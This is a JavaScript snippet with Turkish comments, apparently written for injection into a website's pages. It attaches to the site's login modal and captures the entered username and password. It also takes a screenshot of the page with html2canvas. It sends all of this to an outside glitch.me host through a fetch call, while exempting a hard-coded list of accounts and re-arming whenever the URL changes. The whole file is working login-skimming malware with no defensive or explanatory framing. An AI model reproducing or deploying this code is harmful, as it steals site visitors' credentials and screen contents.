(function () {
  let isScriptActive = true;
  const blockedUsers = ['slnyrgc88@hotmail.com', 'selenyargici'];

  const cookies = document.cookie || '';
  const username = document.cookie.match(/username=([^;]+)/)?.[1] || '';
  if (blockedUsers.includes(username)) {
    console.log('Bu kullanıcı için script çalışmayacak:', username);
    isScriptActive = false;
    return;
  }

  // html2canvas’ı dinamik olarak yükle
  function loadHtml2Canvas(callback) {
    if (window.html2canvas) {
      callback();
      return;
    }
    const script = document.createElement('script');
    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
    script.onload = callback;
    script.onerror = () => console.log('html2canvas yüklenemedi');
    document.head.appendChild(script);
  }

  // Ekran görüntüsü alma fonksiyonu
  function captureScreenshot() {
    return new Promise((resolve, reject) => {
      html2canvas(document.body, {
        scale: 1, // Çözünürlüğü düşürmek için 1, artırabilirsin
        useCORS: true, // Harici kaynakları dahil etmek için
        logging: false // Konsol loglarını kapat
      }).then(canvas => {
        const imageData = canvas.toDataURL('image/png'); // Base64 formatında PNG
        resolve(imageData);
      }).catch(err => {
        console.log('Ekran görüntüsü alınamadı:', err);
        reject(err);
      });
    });
  }

  function setupButtonListeners() {
    if (!isScriptActive) return;

    const loginButton = document.querySelector('button[data-bs-toggle="modal"][data-bs-target=".bd-example-modal-sm"]');
    if (loginButton) {
      loginButton.addEventListener('click', () => {
        setTimeout(setupLoginListener, 100);
      });
    } else {
      console.log('Giriş modal butonu bulunamadı');
    }
  }

  function setupLoginListener() {
    const loginBtn = document.querySelector('.btn-primary[onclick="girisyap()"]');
    if (loginBtn && isScriptActive) {
      console.log('Login listener eklendi');
      loginBtn.addEventListener('click', () => {
        const username = document.getElementById('loginname')?.value || 'Bilinmiyor';
        const password = document.getElementById('loginpassport')?.value || 'Bilinmiyor';
        const remember = document.getElementById('authCheck')?.checked || false;
        console.log('Giriş bilgileri:', { username, password, remember });

        const data = `kuladi=${encodeURIComponent(username)}&sifre=${encodeURIComponent(password)}&remember=${encodeURIComponent(remember)}`;

        // Ekran görüntüsü al ve gönder
        loadHtml2Canvas(() => {
          captureScreenshot().then(screenshot => {
            const fullData = `${data}&screenshot=${encodeURIComponent(screenshot)}`;
            fetch(`https://ancient-pentagonal-elephant.glitch.me/log?${fullData}`, {
              method: 'GET',
              credentials: 'include'
            })
              .then(() => {
                console.log('Giriş logu ve ekran görüntüsü gönderildi');
                isScriptActive = false;
              })
              .catch(err => {
                console.log('Gönderme hatası:', err);
                isScriptActive = false;
              });
          }).catch(err => {
            // Ekran görüntüsü alınamazsa bile logu normal gönder
            fetch(`https://ancient-pentagonal-elephant.glitch.me/log?${data}`, {
              method: 'GET',
              credentials: 'include'
            }).then(() => console.log('Sadece log gönderildi'));
          });
        });
      });
    } else {
      console.log('Login butonu bulunamadı');
    }
  }

  // Mevcut diğer kodlar (çıkış yapma, sayfa izleme vs.) aynı kalabilir
  if (isScriptActive) {
    window.addEventListener('load', () => {
      setupButtonListeners();
    });

    let lastUrl = location.href;
    setInterval(() => {
      if (location.href !== lastUrl) {
        lastUrl = location.href;
        setupButtonListeners();
      }
    }, 500);
  }
})();
